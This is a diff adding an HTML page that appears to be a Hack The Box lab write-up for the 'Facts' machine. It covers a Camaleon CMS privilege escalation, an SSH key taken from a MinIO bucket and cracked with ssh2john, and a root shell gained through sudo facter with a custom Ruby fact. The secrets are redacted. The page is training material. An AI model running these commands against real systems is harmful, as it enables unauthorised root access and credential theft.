@@ -1,0 +1,87 @@
+<!doctype html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>HTB Facts | Daniel Galindo</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com" />
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+    <link
+      href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;600;700&family=Space+Grotesk:wght@400;500;700&display=swap"
+      rel="stylesheet"
+    />
+    <link rel="stylesheet" href="/src/styles/styles.css" />
+  </head>
+  <body data-page="writeups">
+    <div class="grid-overlay" aria-hidden="true"></div>
+    <div class="noise-overlay" aria-hidden="true"></div>
+
+    <header class="site-header">
+      <a class="site-logo" href="/en/index.html">met4ll0f</a>
+      <nav class="site-nav" aria-label="Main navigation">
+        <a data-nav="home" href="/en/index.html">Home</a>
+        <a data-nav="writeups" href="/en/writeups.html">Writeups</a>
+        <a data-nav="scripts" href="/en/scripts.html">Scripts</a>
+      </nav>
+    </header>
+
+    <section class="hero hero-compact">
+      <p class="hero-kicker">Hack The Box - Linux Web Exploitation</p>
+      <h1>HTB Facts</h1>
+      <p class="headline">Camaleon CMS privilege escalation, MinIO object exposure and sudo facter abuse</p>
+      <p class="meta">Retired - Root / Administrator</p>
+    </section>
+
+    <main class="writeup-article">
+      <section class="panel panel-large">
+<h2>Executive Summary</h2>
+<p>Facts exposes a Camaleon CMS instance and a MinIO service. A CMS vulnerability is used to elevate a self-registered account to administrator, which exposes object-storage credentials.</p>
+<h2>Initial Access</h2>
+<p>After authenticating to MinIO with the recovered access material, the <code>internal</code> bucket reveals an encrypted SSH private key. The key is downloaded, converted with <code>ssh2john</code>, cracked, and used for SSH access.</p>
+<h2>Privilege Escalation</h2>
+<p><code>sudo -l</code> shows that <code>facter</code> can be executed with elevated privileges. A custom Ruby fact executes <code>/bin/sh</code>, and passing its directory through <code>--custom-dir</code> spawns a root shell.</p>
+<h2>Publishing Note</h2>
+<p>The public writeup intentionally redacts object-storage secrets and private-key material. The exploitation chain is preserved without publishing reusable secret blobs.</p>
+<h2>Key Commands</h2>
+<pre><code class="language-bash">feroxbuster -u http://facts.htb/ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -x php,txt,js,html -t 50</code></pre>
+<pre><code class="language-bash">mc alias set facts http://facts.htb:54321 &lt;redacted-minio-access&gt; &lt;redacted-minio-value&gt;</code></pre>
+<pre><code class="language-bash">mc ls facts/</code></pre>
+<pre><code class="language-bash">mc get facts/internal/.ssh/id_ed25519 id_rsa</code></pre>
+<pre><code class="language-bash">python2 /usr/lib/john/ssh2john.py id_rsa &gt; id.hash</code></pre>
+<pre><code class="language-bash">echo &#39;exec &quot;/bin/sh&quot;&#39; &gt; /tmp/piv/a.rb</code></pre>
+<pre><code class="language-bash">sudo /usr/bin/facter --custom-dir=/tmp/piv</code></pre>
+<h2>Evidence Trail</h2>
+<p>The following screenshots preserve the original lab evidence sequence from the Obsidian notes.</p>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/facts/Pasted%20image%2020260221183912.png" alt="facts evidence 01" /></figure>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/facts/Pasted%20image%2020260221184225.png" alt="facts evidence 02" /></figure>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/facts/Pasted%20image%2020260221184444.png" alt="facts evidence 03" /></figure>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/facts/Pasted%20image%2020260221185924.png" alt="facts evidence 04" /></figure>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/facts/Pasted%20image%2020260221190258.png" alt="facts evidence 05" /></figure>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/facts/Pasted%20image%2020260221190536.png" alt="facts evidence 06" /></figure>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/facts/Pasted%20image%2020260221200657.png" alt="facts evidence 07" /></figure>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/facts/Pasted%20image%2020260221205003.png" alt="facts evidence 08" /></figure>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/facts/Pasted%20image%2020260222023708.png" alt="facts evidence 09" /></figure>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/facts/Pasted%20image%2020260222023838.png" alt="facts evidence 10" /></figure>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/facts/Pasted%20image%2020260222024000.png" alt="facts evidence 11" /></figure>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/facts/Pasted%20image%2020260222024302.png" alt="facts evidence 12" /></figure>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/facts/Pasted%20image%2020260222024514.png" alt="facts evidence 13" /></figure>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/facts/Pasted%20image%2020260222025715.png" alt="facts evidence 14" /></figure>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/facts/Pasted%20image%2020260222051704.png" alt="facts evidence 15" /></figure>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/facts/Pasted%20image%2020260222051948.png" alt="facts evidence 16" /></figure>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/facts/Pasted%20image%2020260222052146.png" alt="facts evidence 17" /></figure>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/facts/Pasted%20image%2020260222052333.png" alt="facts evidence 18" /></figure>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/facts/Pasted%20image%2020260222052448.png" alt="facts evidence 19" /></figure>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/facts/Pasted%20image%2020260222053015.png" alt="facts evidence 20" /></figure>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/facts/Pasted%20image%2020260222053300.png" alt="facts evidence 21" /></figure>
+      </section>
+    </main>
+
+    <footer class="footer">
+      <p>© <span class="js-year"></span> <span class="js-name"></span>.</p>
+      <a href="/en/writeups.html">Back to writeups</a>
+    </footer>
+
+    <script type="module" src="/src/js/site.js"></script>
+    <script type="module" src="/src/js/writeup-media.js"></script>
+  </body>
+</html>
